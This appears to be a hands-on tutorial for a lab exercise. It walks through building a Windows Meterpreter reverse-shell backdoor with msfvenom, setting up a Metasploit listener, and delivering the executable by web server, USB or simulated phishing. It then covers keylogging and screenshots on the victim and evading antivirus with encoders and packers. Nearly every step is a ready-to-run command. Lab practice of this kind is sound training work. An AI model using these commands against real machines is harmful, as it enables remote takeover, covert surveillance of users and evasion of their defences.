## What You Need

* A **Kali Linux** or **Parrot OS** attacker machine with Metasploit
* A **Windows VM** (e.g., Windows 10 or 7) as the victim
* Network connection between attacker and victim (host-only or NAT)



## Step 1: Generate the Backdoor (Payload)

On Kali:

```bash
msfvenom --payload windows/meterpreter/reverse_tcp --list-options

To list options to set
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_KALI_IP LPORT=4444 -f exe -o backdoor.exe
```

**Explanation:**

* `-p`: Payload type (reverse shell with Meterpreter)
* `LHOST`: Your Kali Linux IP (listener)
* `LPORT`: Port you want the victim to connect back to
* `-f`: Format (`exe` for Windows)
* `-o`: Output file name

This creates a malicious `.exe` file that connects back to your machine.



## Step 2: Set Up the Listener (Metasploit Handler)

Launch Metasploit:

```bash
msfconsole
```

Configure listener:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST YOUR_KALI_IP
set LPORT 4444
set ExitOnSession false
exploit -j
```

Metasploit will now **listen** for incoming reverse shell connections.



## Step 3: Deliver the Payload

Transfer the `backdoor.exe` to your **Windows victim**. You can do this via:

* USB (in a lab)
* Social engineering simulation (phishing)
* File sharing (Python web server, SMB, etc.)

Example (start web server in Kali):

```bash
python3 -m http.server 8000
```

Then, download from Windows:

```powershell
Invoke-WebRequest -Uri http://KALI_IP:8000/backdoor.exe -OutFile C:\Users\Public\backdoor.exe
```



## Step 4: Execute the Payload

On the victim system, run `backdoor.exe`.

As soon as itâ€™s executed, you should get a **Meterpreter session** on your Kali terminal:

```
[*] Meterpreter session 1 opened
```



## Step 5: Interact with the Victim

Inside Meterpreter:

```bash
sysinfo              # View system info
getuid               # Get user ID
shell                # Open command prompt
keyscan_start        # Start keylogger
screenshot           # Take a screenshot
```



## Bypass Antivirus (Obfuscation)

Basic payloads are often caught by antivirus. You can:

* Use **encoders**:

  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o bypass.exe
  ```

* Use **packers** or **obfuscation** tools like:

  * `Veil Framework`
  * `Shellter`
  * `MSFvenom Payload Creator (msfpc)`




Try it on:

* **Metasploitable Windows VMs**
* **TryHackMe Rooms** like *Windows Privilege Escalation*, *Phishing*, etc.
* **HackTheBox** machines
